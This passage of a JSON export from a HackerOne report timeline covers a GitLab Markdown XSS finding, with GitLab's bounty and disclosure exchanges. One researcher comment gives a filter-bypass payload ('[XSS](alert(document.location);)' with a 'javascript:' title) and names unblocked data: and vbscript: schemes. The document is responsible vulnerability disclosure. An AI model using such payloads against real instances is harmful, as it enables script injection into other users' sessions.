BfcIUtph2FGwzCuy6d0CQhdl914kkFpuTBp69z2htWslZiifdNkKWK0DIJcK%2FrSurcsk8WEaPiZ7tEJAcfYZS4SddR8orMY%2BhEfGsLc5RSVBGXY0UW6zTNw%2BYg82wPCY1Z9kgrjwVLQPpVTje3rfzRO3UEDh0xbd54m7t%2FSL0yItTAuaGshQmPLuW6S%2F5KOdoWWnwCmkruRqE1ZKMsnSko5gBnNELay%2BWeukQAQ6EyIB%2FWB06%2F%2FaYfBiWUzjgZyKRGg99IBpEO3zShFTod3huOdptlvO4PfWBvrB4632o9feKKn5CXqJUOE%2BTT%2BgjHEdWRLP2W3GZAibuc%2FbOIfOwee7%2Bn9cOimwp8NVS4U08VlgiSfhcWXonWb3aOkvnOfX46QkwoP6p%2FwU67AFSjWFI11fWgLkInKyx6Dx9AePw1c4qVefioOdfVonnQ3dNW7fXwjlRC5F1185jkAwhyCARy9%2F7sIPFHaI%2FEID5osYCwdvVwv0O6pPIknWS%2FVG7rXxUIgYk0xp3ln2eURcIkz%2F20YEsL73kMrgQLn%2BEd3AiGH%2F9wW5PEZOVPNqagqBYtUSWzNl9%2BrKCkhyVg8k79SdRjUkvdYLXtvxU1m6oAu2IjxFOCgwXqn1jFH1Lloh4Gp%2Fkq68ckYZB67%2B%2FdOzejM9ofYNi%2BpJRLwSwwu22w857sj9E%2BbC8Ei9i7KZOZGBCWe81d9lycwAH6Q%3D%3D\u0026X-Amz-Signature=a534a70f4e842608aff90de2e101aad7bb47d2af1d1e40df8f2627ddf82f45db"}],"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4981692,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi,\n\nThank you again for the report! Your finding has been patched in GitLab version 11.11.1 and we are awarding a bounty. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nSecurity Team | GitLab Inc.\n","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eThank you again for the report! Your finding has been patched in GitLab version 11.11.1 and we are awarding a bounty. Congratulations!\u003c/p\u003e\n\n\u003cp\u003ePlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab\u0026#39;s issue tracker.\u003c/p\u003e\n\n\u003cp\u003eWe look forward to your next report!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nSecurity Team | GitLab Inc.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-03T14:23:02.847Z","updated_at":"2019-06-03T14:23:02.847Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ryhmnlfj","url":"/ryhmnlfj"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4981711,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-03T14:23:13.032Z","updated_at":"2019-06-03T14:23:13.032Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"4500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"ryhmnlfj","url":"/ryhmnlfj"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5005525,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @hackerjuan, thank you for bounty!\n\n\u003e Please let us know if you find that our patch does not mitigate your finding.\n\nThe following two problems are **unresolved on `GitLab CE/EE 11.11.1`.**\n\n* The following vector described in the additional report is still valid.  \n  \n  * Title: `javascript:`  \n  * Format: Markdown  \n  * Content: `[XSS](alert(document.location);)`  \n  \n  The function `apply_file_link_rules!` acts as a bypass because the string `.location)` is misrecognized as a file extension. For more details, please read the additional report I sent as a comment on 2019-05-17.\n\n* `data:` and `vbscript:` are not blocked. These schemes are blocked by other filters in **lib/banzai/filter/**.\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/hackerjuan\"\u003e@hackerjuan\u003c/a\u003e, thank you for bounty!\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003ePlease let us know if you find that our patch does not mitigate your finding.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThe following two problems are \u003cstrong\u003eunresolved on \u003ccode\u003eGitLab CE/EE 11.11.1\u003c/code\u003e.\u003c/strong\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eThe following vector described in the additional report is still valid.  \u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eTitle: \u003ccode\u003ejavascript:\u003c/code\u003e\u003cbr\u003e\n\u003c/li\u003e\n\u003cli\u003eFormat: Markdown\u003cbr\u003e\n\u003c/li\u003e\n\u003cli\u003eContent: \u003ccode\u003e[XSS](alert(document.location);)\u003c/code\u003e\u003cbr\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe function \u003ccode\u003eapply_file_link_rules!\u003c/code\u003e acts as a bypass because the string \u003ccode\u003e.location)\u003c/code\u003e is misrecognized as a file extension. For more details, please read the additional report I sent as a comment on 2019-05-17.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003ccode\u003edata:\u003c/code\u003e and \u003ccode\u003evbscript:\u003c/code\u003e are not blocked. These schemes are blocked by other filters in \u003cstrong\u003elib/banzai/filter/\u003c/strong\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2019-06-05T14:34:43.034Z","updated_at":"2019-06-05T14:34:43.034Z","actor":{"username":"ryhmnlfj","cleared":false,"url":"/ryhmnlfj","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/564/715/09a17da22e888e053764acd1492f67b09d455e84_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5005617,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for pointing this out! I'm going to reopen the report and the tracking issue and follow up with the developer. \nWe'll let you know as soon as we have any updates.","markdown_message":"\u003cp\u003eThanks for pointing this out! I\u0026#39;m going to reopen the report and the tracking issue and follow up with the developer. \u003cbr\u003e\nWe\u0026#39;ll let you know as soon as we have any updates.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-05T14:56:06.786Z","updated_at":"2019-06-05T14:56:06.786Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5005618,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-05T14:56:19.759Z","updated_at":"2019-06-05T14:56:19.759Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5021143,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ETA for fix:\n\nHi @ryhmnlfj,\n\nThe GitLab issue created from your report is currently scheduled for 2019-07-22.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eETA for fix:\u003c/p\u003e\n\n\u003cp\u003eHi \u003ca href=\"/ryhmnlfj\"\u003e@ryhmnlfj\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe GitLab issue created from your report is currently scheduled for 2019-07-22.\u003c/p\u003e\n\n\u003cp\u003eThank you again for contacting us!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2019-06-07T04:31:14.046Z","updated_at":"2019-06-07T04:31:14.046Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5508459,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ETA for fix:\n\nHi @ryhmnlfj,\n\nThe GitLab issue created from your report is currently scheduled for 2019-08-22.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eETA for fix:\u003c/p\u003e\n\n\u003cp\u003eHi \u003ca href=\"/ryhmnlfj\"\u003e@ryhmnlfj\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe GitLab issue created from your report is currently scheduled for 2019-08-22.\u003c/p\u003e\n\n\u003cp\u003eThank you again for contacting us!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2019-08-06T04:31:39.267Z","updated_at":"2019-08-06T04:31:39.267Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5701516,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-30T22:35:03.674Z","updated_at":"2019-08-30T22:35:03.674Z","actor":{"username":"akelly","cleared":false,"url":"/akelly","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"ryhmnlfj","url":"/ryhmnlfj"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5701518,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hello @ryhmnlfj,\n\nNow that it has been 30 days since a fix was released for this finding, we would like to publicly disclose this report.\n\nPlease note that [the GitLab issue](https://gitlab.com/gitlab-org/gitlab-ce/issues/60143) for this report has now been set to public. If you see any sensitive information that needs to be redacted or removed in that GitLab issue or this report, please let me know here.\n\nThanks again for helping make GitLab more secure.\n\nHave a great day,\nAndrew\nSecurity Team | GitLab","markdown_message":"\u003cp\u003eHello \u003ca href=\"/ryhmnlfj\"\u003e@ryhmnlfj\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eNow that it has been 30 days since a fix was released for this finding, we would like to publicly disclose this report.\u003c/p\u003e\n\n\u003cp\u003ePlease note that \u003ca href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-ce%2Fissues%2F60143\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ethe GitLab issue\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e for this report has now been set to public. If you see any sensitive information that needs to be redacted or removed in that GitLab issue or this report, please let me know here.\u003c/p\u003e\n\n\u003cp\u003eThanks again for helping make GitLab more secure.\u003c/p\u003e\n\n\u003cp\u003eHave a great day,\u003cbr\u003e\nAndrew\u003cbr\u003e\nSecurity Team | GitLab\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-30T22:36:06.010Z","updated_at":"2019-08-30T22:36:06.010Z","first_to_agree":true,"actor":{"username":"akelly","cleared":false,"url":"/akelly","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5711662,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @akelly ,\nThanks for update. Let's disclose this report.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/akelly\"\u003e@akelly\u003c/a\u003e ,\u003cbr\u003e\nThanks for update. Let\u0026#39;s disclose this report.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-02T11:29:31.686Z","updated_at":"2019-09-02T11:29:31.686Z","actor":{"username":"ryhmnlfj","cleared":false,"url":"/ryhmnlfj","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/564/715/09a17da22e888e053764acd1492f67b09d455e84_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5711666,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-02T11:30:07.716Z","updated_at":"2019-09-02T11:30:07.716Z","actor":{"username":"ryhmnlfj","cleared":false,"url":"/ryhmnlfj","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/564/715/09a17da22e888e053764acd1492f67b09d455e84_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5711667,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-02T11:30:07.800Z","updated_at":"2019-09-02T11:30:07.800Z","actor":{"username":"ryhmnlfj","cleared":false,"url":"/ryhmnlfj","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/564/715/09a17da22e888e053764acd1492f67b09d455e84_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}